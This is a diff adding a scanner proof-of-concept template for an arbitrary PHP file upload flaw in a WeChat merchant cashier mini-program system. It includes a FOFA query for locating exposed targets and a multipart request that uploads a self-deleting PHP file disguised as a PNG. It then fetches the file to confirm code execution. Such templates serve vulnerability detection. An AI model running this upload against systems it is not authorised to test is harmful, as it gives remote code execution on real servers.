@@ -1,0 +1,33 @@
+id: poc-yaml-cashier-mini-program-upload-iframe-php-anyfile-upload
+info:
+  name: 微信公众号商家收银台小程序系统 upload.iframe.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 微信公众号商家收银台小程序系统
+  fofa: body="/index.php?s=platform/index/captcha"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /library/deep/upload.iframe.php?action=add&MaxSize=&FileType=php&savePath=&backIdName=&saveName=0
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywb0ftWeTnkfnoTM2
+  data: '------WebKitFormBoundarywb0ftWeTnkfnoTM2
+
+    Content-Disposition: form-data; name="uploadFileName"; filename="123.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundarywb0ftWeTnkfnoTM2--'
+  expression: status_code == 200 && contains(body,"data/uploadfile") && contains(body,".php")
+  output:
+  - regex_match(body,`data/uploadfile//(?P<filename>[0-9]+).php`)
+- method: GET
+  path: /data/uploadfile/{{.filename}}.php
+  expression: status_code == 200 && body == t2
+transport: http
